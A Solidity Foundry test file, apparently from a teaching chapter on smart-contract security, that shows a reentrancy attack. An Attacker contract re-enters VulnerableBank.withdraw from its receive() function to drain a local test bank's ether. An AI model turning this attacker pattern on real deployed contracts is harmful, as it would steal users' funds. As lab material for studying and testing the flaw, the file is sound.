// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../../src/ch27/VulnerableBank.sol";

/// @title ReentrancyTest - 重入漏洞验证测试（ch27 版本）
contract ReentrancyTest is Test {
    VulnerableBank bank;
    Attacker attacker;

    function setUp() public {
        bank = new VulnerableBank();
        attacker = new Attacker(address(bank));
    }

    function test_reentrancy_drain() public {
        vm.deal(address(bank), 10 ether);
        vm.prank(address(attacker));
        bank.deposit{value: 1 ether}();
        attacker.attack();
        // 银行余额应该剩 9 ETH，但实际被掏空
        assertLt(address(bank).balance, 10 ether);
    }
}

contract Attacker {
    VulnerableBank public bank;
    uint256 public attackCount;

    constructor(address _bank) {
        bank = VulnerableBank(payable(_bank));
    }

    function attack() external {
        bank.withdraw(1 ether);
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether && attackCount < 10) {
            attackCount++;
            bank.withdraw(1 ether);
        }
    }
}
